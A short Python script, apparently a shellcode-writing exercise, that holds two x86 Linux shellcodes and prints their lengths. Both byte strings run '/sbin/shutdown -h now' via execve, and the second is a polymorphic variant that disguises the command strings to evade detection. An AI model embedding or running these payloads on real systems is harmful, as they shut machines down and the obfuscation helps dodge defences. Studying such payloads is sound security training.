#!/usr/bin/python

# shows the size of two shellcodes
# author: Ian McLachlan

import os

shellcode_old = ("\x31\xc0\x31\xd2\x50\x66\x68\x2d\x68\x89\xe7\x50\x6a\x6e\x66\xc7\x44\x24\x01\x6f\x77\x89\xe7\x50\x68\x64\x6f\x77\x6e\x68\x73\x68\x75\x74\x68\x6e\x2f\x2f\x2f\x68\x2f\x73\x62\x69\x89\xe3\x52\x56\x57\x53\x89\xe1\xb0\x0b\xcd\x80")


shellcode_new = ("\xb8\x00\x00\x00\x00\xba\x00\x00\x00\x00\x6a\x00\x6a\x2d\x6a\x68\x89\xe7\x6a\x00\x6a\x6e\x66\xc7\x44\x24\x01\x6f\x89\xe7\x6a\x00\x68\x42\x4d\x55\x4c\x5b\x81\xc3\x22\x22\x22\x22\x53\x68\x84\x79\x86\x85\x5b\x81\xeb\x11\x11\x11\x11\x53\x68\x11\x11\x11\x11\x5b\x81\xc3\x5d\x1e\x1e\x1e\x53\x68\x2f\x73\x62\x69\x89\xe3\x52\x56\x57\x53\x89\xe1\xb0\x0b\xcd\x80")



os.system('clear')

print '**********************************************'
print '* Shellcode Length Comparer*'
print '**********************************************\r\n'


print 'Length of shellcode old: 		 	%d\r\n\r\n' % len(shellcode_old)
print 'Length of shellcode new: 		 	%d\r\n\r\n' % len(shellcode_new)

